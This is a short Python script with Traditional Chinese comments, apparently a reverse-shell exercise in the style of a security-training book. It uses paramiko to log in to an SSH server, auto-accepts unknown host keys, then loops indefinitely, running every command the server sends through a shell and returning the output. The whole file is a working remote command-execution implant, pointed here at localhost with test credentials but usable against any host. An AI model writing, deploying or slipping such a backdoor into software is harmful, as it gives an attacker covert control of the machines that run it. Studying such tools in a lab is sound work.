import threading
import paramiko
import subprocess
import platform

def ssh_command(ip, user, passwd, command):
    # 建立ssh的Client端
    client = paramiko.SSHClient()
    # We could use host keys
    #client.load_host_keys('/home/vagrant/.ssh/known_hosts')
    
    # 使用傳統的使用者名稱與密碼的方式進行認證
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 發起ssh連線
    client.connect(ip, username=user, password=passwd)
    # 開啟session
    ssh_session = client.get_transport().open_session()
    
    # 當連線成功時就執行命令
    if ssh_session.active:
        ssh_session.send(command)
        # 讀取登入的歡迎內容
        print(ssh_session.recv(1024).decode())
        while True:
            # 從ssh伺服器取得指令
            command = ""
            while "\n" not in command:
                 command += ssh_session.recv(1024).decode()
            try:
                print('receive command:', command)
                cmd_output = subprocess.check_output(command, shell=True)
                # 將執行shell command回傳的bytes字串以cp950(windows cmd default encoding)編碼成字串 
                if platform.system() == 'Windows':
                    output_encoding = 'cp950'
                    cmd_output = cmd_output.decode(output_encoding)
                    cmd_output = cmd_output.encode()
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())

        client.close()
    return

ssh_command('127.0.0.1', 'test', 'test', 'ClientConnected')